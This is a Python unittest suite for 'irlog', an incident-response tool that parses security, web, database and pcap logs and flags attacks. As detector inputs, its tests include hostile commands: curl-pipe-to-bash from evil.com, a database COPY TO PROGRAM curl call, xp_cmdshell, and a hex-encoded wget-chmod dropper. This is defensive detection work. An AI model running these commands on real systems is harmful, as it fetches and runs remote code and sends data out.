"""irlog 单元测试与端到端测试（纯标准库 unittest）。

运行：python -m unittest discover -s tests -v
"""
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from irlog.config import Config
from irlog.detectors import IOCStore, build_detectors
from irlog.engine import run_analysis
from irlog.evidence import EvidenceSet, sha256_file, chain_of_custody
from irlog.parsers import detect_parser, iter_events
from irlog.report_html import build_html
from irlog.report_playbook import build_playbook_html
from irlog.respond import (PLAYBOOKS, PLACEHOLDERS, STAGES, build_playbook,
                           extract_vars, playbook_markdown)
from irlog.server import parse_multipart

FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures")


def fx(name: str) -> str:
    return os.path.join(FIXTURES, name)


class TestParsers(unittest.TestCase):
    def test_autodetect(self):
        cases = {
            "winsec_security.xml": "winxml",
            "sysmon.xml": "winxml",
            "auth.log": "linux-auth",
            "nginx_access.log": "web-access",
            "iis_w3c.log": "iis",
            "middleware.jsonl": "jsonl",
        }
        for name, expected in cases.items():
            with self.subTest(name=name):
                self.assertEqual(detect_parser(fx(name)).name, expected)

    def test_winsec_fields(self):
        events = list(iter_events(fx("winsec_security.xml")))
        self.assertEqual(len(events), 12)
        failed = [e for e in events if e.event_id == "4625"]
        self.assertEqual(len(failed), 5)
        self.assertEqual(failed[0].src_ip, "203.0.113.66")
        self.assertEqual(failed[0].user, "administrator")
        self.assertEqual(failed[0].action, "logon-failed")
        self.assertIsNotNone(failed[0].ts)
        created = [e for e in events if e.event_id == "4720"][0]
        self.assertEqual(created.user, "backdoor_svc")
        self.assertEqual(created.action, "user-created")

    def test_sysmon_fields(self):
        events = list(iter_events(fx("sysmon.xml")))
        proc = [e for e in events if e.event_id == "1"][0]
        self.assertEqual(proc.action, "process-create")
        self.assertEqual(proc.parent_process, r"C:\Windows\System32\inetsrv\w3wp.exe")
        self.assertIn("net user backdoor", proc.detail.get("CommandLine", ""))

    def test_linux_auth(self):
        events = list(iter_events(fx("auth.log")))
        self.assertEqual(len(events), 15)
        failed = [e for e in events if e.action == "logon-failed"]
        self.assertEqual(len(failed), 12)  # 6 + 5 + 1 break-in
        self.assertEqual(failed[0].src_ip, "198.51.100.23")
        self.assertEqual(failed[0].user, "admin")
        sudo = [e for e in events if e.action == "sudo-command"][0]
        self.assertEqual(sudo.detail["command"], "/bin/bash")

    def test_web_access(self):
        events = list(iter_events(fx("nginx_access.log")))
        self.assertEqual(len(events), 16)
        big = [e for e in events if e.bytes_sent and e.bytes_sent > 50_000_000]
        self.assertEqual(len(big), 2)
        self.assertEqual(big[0].status, 200)

    def test_iis_w3c(self):
        events = list(iter_events(fx("iis_w3c.log")))
        self.assertEqual(len(events), 5)
        pdf = [e for e in events if e.bytes_sent == 104857600][0]
        self.assertEqual(pdf.user, "corp\\zhang")
        # URL 编码 payload（%27+or+1%3D1）应被检测器识别为 SQL 注入
        cfg = Config()
        r = run_analysis([fx("iis_w3c.log")], cfg)
        wa = [a for a in r.alerts if a.rule_id == "web-attack"]
        types = {a.entities.get("attack_type") for a in wa}
        self.assertIn("SQL注入", types)

    def test_jsonl(self):
        events = list(iter_events(fx("middleware.jsonl")))
        self.assertEqual(len(events), 4)
        self.assertEqual(events[1].src_ip, "203.0.113.88")
        self.assertIsNotNone(events[0].ts)

    def test_evidence_readonly(self):
        """证据文件分析前后哈希不变（只读保证）。"""
        with tempfile.TemporaryDirectory() as td:
            src = os.path.join(td, "copy.log")
            with open(fx("auth.log"), "rb") as f:
                data = f.read()
            with open(src, "wb") as f:
                f.write(data)
            before = sha256_file(src)
            cfg = Config()
            run_analysis([src], cfg)
            self.assertEqual(sha256_file(src), before)


class TestDetectors(unittest.TestCase):
    def _run(self, paths, **cfg_kw):
        cfg = Config(**cfg_kw)
        return run_analysis(paths, cfg)

    def test_brute_force(self):
        r = self._run([fx("auth.log")])
        bf = [a for a in r.alerts if a.rule_id == "brute-force"]
        self.assertEqual(len(bf), 2)
        ips = {a.entities["src_ip"] for a in bf}
        self.assertIn("198.51.100.23", ips)
        self.assertIn("10.0.0.200", ips)

    def test_brute_force_threshold_config(self):
        r = self._run([fx("auth.log")], brute_force_threshold=100)
        self.assertEqual([a for a in r.alerts if a.rule_id == "brute-force"], [])

    def test_webshell(self):
        r = self._run([fx("nginx_access.log"), fx("winsec_security.xml")])
        ws = [a for a in r.alerts if a.rule_id == "webshell"]
        uris = {a.entities.get("uri") for a in ws}
        self.assertIn("/uploads/shell.php", uris)
        self.assertTrue(any(a.entities.get("process") for a in ws))

    def test_web_attack(self):
        r = self._run([fx("nginx_access.log")])
        wa = [a for a in r.alerts if a.rule_id == "web-attack"]
        types = {a.entities.get("attack_type") for a in wa}
        self.assertIn("SQL注入", types)
        self.assertIn("路径遍历/敏感文件探测", types)

    def test_account_abuse(self):
        r = self._run([fx("winsec_security.xml"), fx("auth.log")])
        aa = [a for a in r.alerts if a.rule_id == "account-abuse"]
        descs = " ".join(a.description for a in aa)
        self.assertIn("提权链路", descs)
        self.assertIn("暴力破解可能已得手", descs)

    def test_ransomware(self):
        r = self._run([fx("winsec_security.xml")])
        rw = [a for a in r.alerts if a.rule_id == "ransomware"]
        self.assertEqual(len(rw), 1)
        self.assertIn("vssadmin", rw[0].description)

    def test_exfiltration(self):
        r = self._run([fx("nginx_access.log"), fx("iis_w3c.log")])
        ex = [a for a in r.alerts if a.rule_id == "exfiltration"]
        self.assertGreaterEqual(len(ex), 2)
        self.assertTrue(any("quarterly-report" in a.entities.get("uri", "") for a in ex))

    def test_ioc_match(self):
        store = IOCStore()
        store.add("203.0.113.99", source="test")
        store.add("2C26B46B68FFC68FF99B453C1D30413413422D706483BFA0F98A5E886266E7AE", source="test")
        cfg = Config()
        r = run_analysis([fx("nginx_access.log"), fx("sysmon.xml")], cfg, store)
        ioc = [a for a in r.alerts if a.rule_id == "ioc"]
        self.assertGreaterEqual(len(ioc), 1)
        self.assertTrue(any(a.entities["ioc"] == "203.0.113.99" for a in ioc))

    def test_rule_filter(self):
        cfg = Config(rules="brute-force")
        r = run_analysis([fx("auth.log"), fx("nginx_access.log")], cfg)
        rule_ids = {a.rule_id for a in r.alerts}
        self.assertEqual(rule_ids, {"brute-force"})


class TestReports(unittest.TestCase):
    def test_reports_and_custody(self):
        cfg = Config()
        r = run_analysis([fx("winsec_security.xml"), fx("nginx_access.log")], cfg)
        evidence = EvidenceSet()
        for p in (fx("winsec_security.xml"), fx("nginx_access.log")):
            evidence.add_file(p)
        custody = chain_of_custody("TEST-001", "tester", evidence, r.started, r.finished, "1.0.0")
        d = r.to_dict()
        self.assertEqual(d["stats"]["total_events"], 28)
        self.assertEqual(custody["evidence"]["file_count"], 2)
        self.assertEqual(custody["operator"], "tester")
        html = build_html(r, custody)
        self.assertIn("TEST-001", html)
        self.assertIn("证据链", html)
        self.assertIn(custody["evidence"]["items"][0]["sha256"], html)
        # XSS 防护：日志中的 < > 必须被转义
        self.assertNotIn("<script>alert", html)


class TestLargeScale(unittest.TestCase):
    """大规模流式验证：50 万行计时 + 20 万行内存峰值。"""

    @staticmethod
    def _gen(path: str, n: int) -> None:
        with open(path, "w", encoding="utf-8") as f:
            for i in range(n):
                ip = f"10.0.{i % 250}.{(i * 7) % 250}"
                if i % 5000 == 0:  # 每 5000 行一个攻击者请求
                    f.write(f'{ip} - - [14/Oct/2026:10:00:01 +0800] "POST /uploads/shell.php HTTP/1.1" 200 120 "http://x/" "sqlmap/1.7"\n')
                else:
                    f.write(f'{ip} - - [14/Oct/2026:10:00:01 +0800] "GET /page{i % 100}.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"\n')

    def test_500k_lines_timing(self):
        import time
        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, "big_access.log")
            self._gen(path, 500_000)
            t0 = time.time()
            r = run_analysis([path], Config())
            elapsed = time.time() - t0
            self.assertEqual(r.stats["total_events"], 500_000)
            self.assertLess(elapsed, 60, "50 万行应在 60s 内完成")
            ws = [a for a in r.alerts if a.rule_id == "webshell"]
            self.assertGreaterEqual(len(ws), 1)
            print(f"\n[大规模计时] 500,000 行: 耗时 {elapsed:.1f}s, 告警 {len(r.alerts)} 条")

    def test_200k_lines_memory(self):
        import tracemalloc
        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, "big_access.log")
            self._gen(path, 200_000)
            tracemalloc.start()
            r = run_analysis([path], Config())
            _cur, peak = tracemalloc.get_traced_memory()
            tracemalloc.stop()
            self.assertEqual(r.stats["total_events"], 200_000)
            self.assertLess(peak / 1048576, 300, "峰值内存应 < 300MB")
            print(f"\n[大规模内存] 200,000 行: 峰值内存 {peak / 1048576:.0f}MB")


class TestMultipartUpload(unittest.TestCase):
    """multipart 解析：字节级保真（证据完整性）。"""

    @staticmethod
    def _body(fname: str, content: bytes, boundary: str = "----XB") -> bytes:
        return (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
                f"filename=\"{fname}\"\r\nContent-Type: application/octet-stream\r\n\r\n").encode() \
               + content + f"\r\n--{boundary}--\r\n".encode()

    def test_byte_exact_trailing_newlines(self):
        content = b"line1\nline2\n\n"
        got = parse_multipart(self._body("a.log", content), b"----XB")
        self.assertEqual(len(got), 1)
        self.assertEqual(got[0][1], content)

    def test_byte_exact_ending_with_dashes(self):
        content = b"data--\n-- tail\n"
        got = parse_multipart(self._body("b.log", content), b"----XB")
        self.assertEqual(got[0][1], content)

    def test_empty_file(self):
        got = parse_multipart(self._body("empty.log", b""), b"----XB")
        self.assertEqual(got[0][1], b"")

    def test_chinese_filename(self):
        got = parse_multipart(self._body("安全事件.xml", b"<Event/>"), b"----XB")
        self.assertEqual(got[0][0], "安全事件.xml")

    def test_multiple_files(self):
        b = "----XB"
        data = (self._body("f1.log", b"aaa", b) + self._body("f2.log", b"bbb", b))
        got = parse_multipart(data, b.encode())
        self.assertEqual([n for n, _ in got], ["f1.log", "f2.log"])
        self.assertEqual([c for _, c in got], [b"aaa", b"bbb"])

    def test_garbage_returns_empty(self):
        self.assertEqual(parse_multipart(b"not a multipart body", b"----XB"), [])


class TestCommandObfuscation(unittest.TestCase):
    """命令混淆/编码载荷检测：编码识别、混淆特征、LOLBAS、误报控制。"""

    def _run(self, paths, **cfg_kw):
        return run_analysis(paths, Config(**cfg_kw))

    def test_encoded_powershell_detected(self):
        r = self._run([fx("sysmon_obfuscated.xml")])
        obf = [a for a in r.alerts if a.rule_id == "command-obfuscation"]
        self.assertGreaterEqual(len(obf), 7, "至少命中 7 类混淆手法")
        # -enc 长载荷：紧急 + 解码内容可见（含下载地址）
        urgent = [a for a in obf if a.severity == 1]
        self.assertTrue(urgent, "编码载荷含执行/网络关键词应为紧急")
        joined = " ".join(str(a.entities) + a.description for a in obf)
        self.assertIn("203.0.113.99", joined, "解码后的载荷 URL 应出现在告警中")
        self.assertIn("编码命令已解码", joined)

    def test_obfuscation_techniques(self):
        r = self._run([fx("sysmon_obfuscated.xml")])
        joined = " ".join(a.description + str(a.entities) for a in r.alerts)
        self.assertIn("LOLBAS", joined)          # certutil/mshta/regsvr32/bitsadmin
        self.assertIn("空引号插入混淆", joined)    # ev""entvwr
        self.assertIn("^ 插入混淆", joined)       # wh^o^am^i

    def test_no_false_positive_on_benign(self):
        """良性命令（notepad/svchost/长 hex 指纹）不触发混淆规则。"""
        r = self._run([fx("sysmon_obfuscated.xml")])
        obf = [a for a in r.alerts if a.rule_id == "command-obfuscation"]
        for a in obf:
            reasons = " ".join(a.entities.get("reasons", []))
            self.assertNotIn("notepad", reasons)
            self.assertNotIn("svchost", reasons)
            self.assertNotIn("ping.exe", reasons)

    def test_plain_commands_not_flagged(self):
        """明文命令（whoami）与短编码（<12）不触发（防误报边界）。"""
        import base64
        import os
        import tempfile
        short = base64.b64encode(b"calc").decode()  # 8 字符，低于门槛
        xml = (
            '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            "<System><Provider Name=\"Microsoft-Windows-Sysmon\"/><EventID>1</EventID>"
            "<TimeCreated SystemTime=\"2026-10-14T10:30:00.000Z\"/>"
            "<Computer>WK01</Computer></System><EventData>"
            "<Data Name=\"CommandLine\">cmd.exe /c whoami</Data>"
            "<Data Name=\"Image\">C:\\Windows\\System32\\cmd.exe</Data>"
            "<Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>"
            "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">"
            "<System><Provider Name=\"Microsoft-Windows-Sysmon\"/><EventID>1</EventID>"
            "<TimeCreated SystemTime=\"2026-10-14T10:31:00.000Z\"/>"
            "<Computer>WK01</Computer></System><EventData>"
            f"<Data Name=\"CommandLine\">cmd.exe /c echo {short}</Data>"
            "<Data Name=\"Image\">C:\\Windows\\System32\\cmd.exe</Data>"
            "<Data Name=\"ParentImage\">C:\\Windows\\explorer.exe</Data></EventData></Event>")
        with tempfile.TemporaryDirectory() as td:
            p = os.path.join(td, "benign.xml")
            with open(p, "w", encoding="utf-8") as f:
                f.write(xml)
            r = self._run([p])
        self.assertEqual([a for a in r.alerts if a.rule_id == "command-obfuscation"], [])

    def test_decode_helper(self):
        from irlog.detectors.command_obfuscation import _try_decode
        import base64
        tok = base64.b64encode("IEX calc".encode("utf-16-le")).decode()
        dec, label = _try_decode(tok)
        self.assertEqual(label, "utf-16le")
        self.assertIn("IEX calc", dec)
        dec2, _ = _try_decode("bm90LXZhbGlkLWJhc2U2NCExIQ==")
        self.assertIn("not-valid", dec2)

    def test_entropy_helper(self):
        from irlog.detectors.command_obfuscation import _shannon
        self.assertAlmostEqual(_shannon(""), 0.0)
        self.assertAlmostEqual(_shannon("aaaa"), 0.0)
        self.assertGreater(_shannon("aB3xZ9pQ"), 2.5)


class TestLinuxCommandExec(unittest.TestCase):
    """Linux 侧命令执行识别：sshd execute 痕迹 + hex 编码载荷（真实攻击日志回归）。"""

    def _run(self, paths, **cfg_kw):
        return run_analysis(paths, Config(**cfg_kw))

    def test_parser_normalizes_execute_line(self):
        events = list(iter_events(fx("linux_auth_exec.log")))
        execs = [e for e in events if e.action == "command-exec"]
        self.assertEqual(len(execs), 1)
        ev = execs[0]
        self.assertTrue(ev.detail.get("sshd_execute"))
        self.assertIn("/usr/bin/ssh -a -e", ev.detail.get("command", ""))
        self.assertEqual(ev.host, "host")

    def test_hex_payload_detected_urgent(self):
        r = self._run([fx("linux_auth_exec.log")])
        obf = [a for a in r.alerts if a.rule_id == "command-obfuscation"]
        self.assertEqual(len(obf), 1)
        a = obf[0]
        self.assertEqual(a.severity, 1, "hex 载荷 + | sh 管道执行应为紧急")
        reasons = " ".join(a.entities.get("reasons", []))
        self.assertIn("Hex 编码载荷已解码并经管道执行", reasons)
        self.assertIn("sshd execute 痕迹", reasons)
        self.assertIn("macineuss", reasons, "解码出的 C2 域名应出现在告警中")

    def test_benign_lines_not_flagged(self):
        """SHA256 指纹、kex error、正常 sudo 不触发混淆规则。"""
        r = self._run([fx("linux_auth_exec.log")])
        for a in r.alerts:
            if a.rule_id == "command-obfuscation":
                reasons = " ".join(a.entities.get("reasons", []))
                self.assertNotIn("nginx", reasons)
                self.assertNotIn("apt-get", reasons)
                self.assertNotIn("kex", reasons)

    def test_hex_decode_odd_length(self):
        """奇数长度 hex 串（真实日志常见，载荷被截断/插入字符）也能解码。"""
        from irlog.detectors.command_obfuscation import _try_decode_hex
        # 40+ 位奇数长度：含 /tmp/ 关键词
        tok = "2f746d702f7570646174652e7368" * 2 + "2f74"  # 奇数长度收尾
        dec = _try_decode_hex(tok)
        self.assertIn("/tmp/", dec)
        # 良性 64 位 SHA256 不解出可读内容
        sha = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
        dec2 = _try_decode_hex(sha)
        from irlog.detectors.command_obfuscation import HEX_PAYLOAD_KEYWORDS
        self.assertIsNone(HEX_PAYLOAD_KEYWORDS.search(dec2))


class TestAuditdExecve(unittest.TestCase):
    """auditd type=EXECVE：入侵后命令轨迹归一化 + 编码载荷告警（真实日志回归）。"""

    def _run(self, paths, **cfg_kw):
        return run_analysis(paths, Config(**cfg_kw))

    def test_execve_normalized_to_command_exec(self):
        events = list(iter_events(fx("linux_auditd_execve.log")))
        execs = [e for e in events if e.action == "command-exec"]
        self.assertGreaterEqual(len(execs), 10, "全部 EXECVE 行应归一为 command-exec")
        cmds = [e.detail.get("command", "") for e in execs]
        self.assertIn("ls -la", cmds)
        self.assertTrue(any(e.detail.get("execve") for e in execs))

    def test_hex_arg_decoded(self):
        """auditd 对含特殊字符的参数 hex 编码，须还原为可读命令。"""
        from irlog.parsers.linux import _decode_audit_arg
        dec = _decode_audit_arg(
            "7767657420687474703a2f2f6d616c6963696f75732e636f6d2f7570646174652e"
            "7368202d4f202f746d702f7570646174652e73682026262063686d6f64203735352"
            "02f746d702f7570646174652e7368")
        self.assertIn("wget", dec)
        self.assertIn("/tmp/update.sh", dec)
        self.assertEqual(_decode_audit_arg("ls"), "ls")          # 明文原样
        self.assertEqual(_decode_audit_arg("-la"), "-la")

    def test_execve_attacker_ops_alerted(self):
        """下载-落地-执行链 与 hex 管道执行 都应告警且为紧急。"""
        r = self._run([fx("linux_auditd_execve.log")])
        obf = [a for a in r.alerts if a.rule_id == "command-obfuscation"]
        self.assertTrue(obf, "EXECVE 中的攻击者操作必须被检出")
        reasons = " ".join(x for a in obf for x in a.entities.get("reasons", []))
        self.assertIn("下载-落地-执行链", reasons)
        self.assertIn("Hex 编码载荷已解码并经管道执行", reasons)
        self.assertTrue(any(a.severity == 1 for a in obf), "落地执行链应为紧急")
        self.assertIn("malicious.com", reasons, "外联域名应出现在告警中")

    def test_execve_benign_not_flagged(self):
        """cron/systemctl/tar/apt-get 等日常运维命令不得误报。"""
        r = self._run([fx("linux_auditd_execve.log")])
        reasons = " ".join(
            x for a in r.alerts if a.rule_id == "command-obfuscation"
            for x in a.entities.get("reasons", []))
        for benign in ("systemctl", "apt-get", "backup.tar.gz", "cron"):
            self.assertNotIn(benign, reasons, f"{benign} 不应出现在混淆告警中")

    def test_curl_pipe_bash_urgent(self):
        """curl|bash 下载即执行：无落地文件，最隐蔽，必须紧急。"""
        from irlog.detectors.command_obfuscation import CommandObfuscationDetector
        from irlog.models import Event
        d = CommandObfuscationDetector(Config())
        d.feed(Event(ts=None, log_type="linux-auth", source="t",
                     action="command-exec", host="h",
                     detail={"command": "curl -s http://evil.com/m.sh | bash"},
                     raw=""))
        alerts = d.finalize()
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, 1)
        self.assertIn("远程下载并直接管道执行", " ".join(alerts[0].entities["reasons"]))


class TestSessionAttribution(unittest.TestCase):
    """会话归属：无源 IP 的命令执行回溯到发起它的登录会话。"""

    def _run(self, paths, **cfg_kw):
        return run_analysis(paths, Config(**cfg_kw))

    def test_session_open_close_parsed(self):
        from irlog.parsers import iter_events
        import base64, os, tempfile
        log = (
            "May 22 02:01:06 host sshd[1]: Accepted password for admin from 203.0.113.9 port 46118 ssh2\n"
            "May 22 02:01:07 host sshd[1]: pam_unix(sshd:session): session opened for user admin by (uid=0)\n"
            "May 22 02:02:00 host audit[2]: type=EXECVE msg=audit(...): a0=\"ls\" a1=\"-la\"\n"
            "May 22 02:03:00 host sshd[1]: pam_unix(sshd:session): session closed for user admin\n"
            "May 22 02:04:00 host audit[3]: type=EXECVE msg=audit(...): a0=\"pwd\"\n"
        )
        with tempfile.TemporaryDirectory() as td:
            p = os.path.join(td, "s.log")
            with open(p, "w", encoding="utf-8") as f:
                f.write(log)
            events = list(iter_events(p))
        self.assertIn("session-end", [e.action for e in events], "session closed 应被识别")

    def test_single_session_high_confidence(self):
        from irlog.session import SessionTracker
        from irlog.models import Event
        t = SessionTracker()
        t.enrich(Event(ts=1000.0, log_type="linux-auth", source="s",
                       action="logon-success", host="h", user="admin",
                       src_ip="203.0.113.9", detail={}, raw=""))
        ev = Event(ts=1100.0, log_type="linux-auth", source="s",
                   action="command-exec", host="h", detail={"command": "ls -la"}, raw="")
        attr = t.enrich(ev)
        self.assertIsNotNone(attr)
        self.assertEqual(attr["ip"], "203.0.113.9")
        self.assertEqual(attr["confidence"], "高")
        self.assertEqual(ev.src_ip, "203.0.113.9")   # 已回填到事件本身

    def test_brute_forced_ip_wins_over_internal(self):
        """并发会话中：有前置暴破的外网 IP 应被选中，内网 IP 退为候选。"""
        from irlog.session import SessionTracker
        from irlog.models import Event
        t = SessionTracker()
        for _ in range(50):
            t.enrich(Event(ts=900.0, log_type="linux-auth", source="s",
                           action="logon-failed", host="h", user="root",
                           src_ip="203.0.113.9", detail={}, raw=""))
        t.enrich(Event(ts=1000.0, log_type="linux-auth", source="s",
                       action="logon-success", host="h", user="admin",
                       src_ip="203.0.113.9", detail={}, raw=""))
        t.enrich(Event(ts=1005.0, log_type="linux-auth", source="s",
                       action="logon-success", host="h", user="admin",
                       src_ip="10.0.0.25", detail={}, raw=""))
        ev = Event(ts=1100.0, log_type="linux-auth", source="s",
                   action="command-exec", host="h", detail={"command": "id"}, raw="")
        attr = t.enrich(ev)
        self.assertEqual(attr["ip"], "203.0.113.9")
        self.assertEqual(attr["confidence"], "中")
        self.assertIn("10.0.0.25", attr["candidate_ips"])
        self.assertGreaterEqual(attr["prior_failures"], 50)

    def test_attribution_in_alert(self):
        """真实回归：日志里的恶意命令应归属到暴破得手的 IP。"""
        r = self._run([fx("linux_auditd_execve.log")])
        obf = [a for a in r.alerts if a.rule_id == "command-obfuscation"]
        self.assertTrue(obf)
        with_ip = [a for a in obf if a.entities.get("src_ip")]
        self.assertTrue(with_ip, "告警应带归属 IP（该夹具内存在已登录会话）")
        self.assertIn("attribution_confidence", with_ip[0].entities)
        self.assertIn("candidate_ips", with_ip[0].entities)

    def test_no_session_no_fabrication(self):
        """没有任何登录会话时不得凭空造 IP。"""
        from irlog.session import SessionTracker
        from irlog.models import Event
        t = SessionTracker()
        ev = Event(ts=1100.0, log_type="linux-auth", source="s",
                   action="command-exec", host="h", detail={"command": "ls -la"}, raw="")
        self.assertIsNone(t.enrich(ev))
        self.assertIsNone(ev.src_ip)


class TestDatabaseParsers(unittest.TestCase):
    """数据库日志解析：MySQL / PostgreSQL / SQL Server / MongoDB / Redis。"""

    def _run(self, paths, **cfg_kw):
        return run_analysis(paths, Config(**cfg_kw))

    def test_mysql_detected(self):
        self.assertEqual(detect_parser(fx("mysql_error_general.log")).name, "database")

    def test_mysql_access_denied_with_ip(self):
        events = list(iter_events(fx("mysql_error_general.log")))
        fails = [e for e in events if e.action == "logon-failed"]
        self.assertGreaterEqual(len(fails), 8)
        ips = {e.src_ip for e in fails}
        self.assertIn("203.0.113.55", ips)
        self.assertIn("root", {e.user for e in fails})

    def test_general_log_thread_correlation(self):
        """general log 的 Query 行只有线程号，必须靠 Connect 行关联回账号与来源 IP。"""
        events = list(iter_events(fx("mysql_error_general.log")))
        queries = [e for e in events if e.action == "db-query"]
        union = [e for e in queries if "UNION SELECT" in (e.detail.get("sql") or "")]
        self.assertTrue(union, "应解析出 Query 语句")
        self.assertEqual(union[0].user, "appuser")
        self.assertEqual(union[0].src_ip, "10.0.0.30")

    def test_postgresql_detected(self):
        events = list(iter_events(fx("postgresql_csv.log")))
        self.assertEqual(detect_parser(fx("postgresql_csv.log")).name, "database")
        fails = [e for e in events if e.action == "logon-failed"]
        self.assertGreaterEqual(len(fails), 6)
        self.assertIn("203.0.113.77", {e.src_ip for e in fails})
        stmts = [e for e in events if e.action == "db-query"]
        self.assertTrue(stmts)
        # csvlog 消息字段的外层引号必须剥掉，不能污染 SQL
        for e in stmts:
            self.assertFalse((e.detail.get("sql") or "").endswith('"'),
                             f"SQL 尾部不应残留引号: {e.detail['sql'][:60]}")

    def test_mssql_mongo_redis_detected(self):
        events = list(iter_events(fx("mssql_mongo_redis.log")))
        fails = [e for e in events if e.action == "logon-failed"]
        ips = {e.src_ip for e in fails}
        self.assertIn("198.51.100.9", ips)     # SQL Server [CLIENT:]
        self.assertIn("203.0.113.200", ips)    # MongoDB attr.client
        self.assertIn("203.0.113.211", ips)    # Redis addr=
        ok = [e for e in events if e.action == "logon-success"]
        self.assertTrue(ok, "应有成功登录（MSSQL Login succeeded / Redis ready）")

    def test_slow_log_parsed(self):
        events = list(iter_events(fx("mysql_slow.log")))
        queries = [e for e in events if e.action == "db-query"]
        self.assertTrue(queries)
        self.assertTrue(all(e.user == "appuser" for e in queries))
        # MySQL 自带的 SET timestamp 前缀不是业务 SQL，不应进入检测
        self.assertFalse(any((e.detail.get("sql") or "").upper().startswith("SET TIMESTAMP")
                             for e in queries))

    def test_db_bruteforce_reuses_existing_rule(self):
        """数据库认证失败归一化后应直接命中既有 brute-force 规则，无需新规则。"""
        r = self._run([fx("mysql_error_general.log")])
        bf = [a for a in r.alerts if a.rule_id == "brute-force"]
        self.assertTrue(any(a.entities.get("src_ip") == "203.0.113.55" for a in bf))


class TestDbAttackDetector(unittest.TestCase):
    """数据库攻击检测：注入落地、破坏、提权、拖库，以及误报控制。"""

    def _run(self, paths, **cfg_kw):
        return run_analysis(paths, Config(**cfg_kw))

    def _feed(self, sqls, user="appuser", ip="10.0.0.30"):
        from irlog.detectors.db_attack import DbAttackDetector
        from irlog.models import Event
        d = DbAttackDetector(Config())
        for i, s in enumerate(sqls):
            d.feed(Event(ts=1000.0 + i, log_type="database", source="t",
                         action="db-query", host="db", user=user, src_ip=ip,
                         detail={"sql": s}, raw=s))
        return d.finalize()

    def test_injection_landed_urgent(self):
        r = self._run([fx("mysql_error_general.log")])
        db = [a for a in r.alerts if a.rule_id == "db-attack"]
        urgent = [a for a in db if a.severity == 1]
        self.assertTrue(urgent, "注入落地/破坏性语句应为紧急")
        joined = " ".join(x for a in db for x in a.entities.get("reasons", []))
        self.assertIn("UNION SELECT", joined)
        self.assertIn("恒真条件绕过认证", joined)
        self.assertIn("LOAD_FILE", joined)
        # 告警要带得动溯源：账号与来源 IP
        self.assertTrue(any(a.entities.get("user") == "appuser" for a in db))

    def test_destructive_without_where(self):
        alts = self._feed(["DROP TABLE orders"])
        self.assertEqual(len(alts), 1)
        self.assertEqual(alts[0].severity, 1)
        self.assertIn("破坏性语句", " ".join(alts[0].entities["reasons"]))

    def test_update_with_where_not_flagged(self):
        """带 WHERE 的 UPDATE/DELETE 是正常业务，不得误报为破坏性语句。"""
        alts = self._feed([
            "UPDATE products SET price = 9.9 WHERE id = 5",
            "DELETE FROM sessions WHERE expired < NOW()",
            "SELECT id, name FROM products WHERE category = 'book'",
        ])
        self.assertEqual(alts, [], f"正常业务 SQL 不应告警：{[a.entities for a in alts]}")

    def test_privilege_escalation(self):
        alts = self._feed(["GRANT ALL PRIVILEGES ON *.* TO 'x'@'%'",
                           "CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so'"])
        joined = " ".join(x for a in alts for x in a.entities["reasons"])
        self.assertIn("权限或账号变更", joined)
        self.assertTrue(all(a.severity <= 2 for a in alts))

    def test_command_execution_via_db(self):
        """xp_cmdshell 与 PG COPY TO PROGRAM 都是命令执行/外传，必须紧急。"""
        from irlog.models import Event
        from irlog.detectors.db_attack import DbAttackDetector
        d = DbAttackDetector(Config())
        for s in ("EXEC xp_cmdshell 'whoami'",
                  "COPY cards TO PROGRAM 'curl http://evil.example.com'"):
            d.feed(Event(ts=1.0, log_type="database", source="t", action="db-query",
                         host="db", user="sa", src_ip="198.51.100.9",
                         detail={"sql": s}, raw=s))
        alts = d.finalize()
        self.assertTrue(any(a.severity == 1 for a in alts))
        joined = " ".join(x for a in alts for x in a.entities["reasons"])
        self.assertIn("文件读写或命令执行函数", joined)

    def test_mass_dump_detected(self):
        """窗口内对敏感表的批量查询应触发拖库告警（中危）。"""
        sqls = [f"SELECT * FROM users WHERE id = {i}" for i in range(25)]
        alts = self._feed(sqls)
        dumps = [a for a in alts if any("敏感表批量查询" in r for r in a.entities["reasons"])]
        self.assertTrue(dumps, f"应检出拖库：{[a.entities for a in alts]}")

    def test_pg_and_slow_log_alert(self):
        for fn in ("postgresql_csv.log", "mysql_slow.log"):
            r = self._run([fx(fn)])
            self.assertTrue([a for a in r.alerts if a.rule_id == "db-attack"],
                            f"{fn} 应产生数据库告警")


class TestPcapParsing(unittest.TestCase):
    """pcap / pcapng 解析：格式识别、事件还原、gzip 支持。"""

    def _events(self, name: str) -> list:
        return list(iter_events(fx(name)))

    def test_detect_pcap_and_pcapng(self):
        for name in ("traffic_scan_c2.pcap", "traffic_dns_web.pcapng", "traffic_benign.pcap"):
            with self.subTest(name=name):
                self.assertEqual(detect_parser(fx(name)).name, "pcap")

    def test_pcap_binary_is_valid_evidence(self):
        """pcap 含大量 \\x00，必须被 is_probably_log 放行（否则会被整份跳过）。"""
        from irlog.parsers import is_probably_log
        self.assertTrue(is_probably_log(fx("traffic_scan_c2.pcap")))
        self.assertTrue(is_probably_log(fx("traffic_dns_web.pcapng")))

    def test_pcap_events_restored(self):
        from irlog.models import (A_NETWORK_CONN, A_NET_DNS, A_NET_TLS,
                                  A_NET_CRED, A_NET_FLOW, A_HTTP_REQUEST)
        evs = self._events("traffic_dns_web.pcapng")
        actions = {e.action for e in evs}
        for a in (A_NETWORK_CONN, A_NET_DNS, A_NET_TLS, A_NET_CRED,
                  A_NET_FLOW, A_HTTP_REQUEST):
            self.assertIn(a, actions)

        dns = [e for e in evs if e.action == A_NET_DNS and not e.detail["is_response"]]
        self.assertTrue(dns and dns[0].domain.startswith("xq7f3k9z"))
        # 响应事件 src_ip 应为查询方（客户端），而非 DNS 服务器
        resp = [e for e in evs if e.action == A_NET_DNS and e.detail["is_response"]]
        self.assertTrue(resp and resp[0].src_ip == "10.0.0.7")

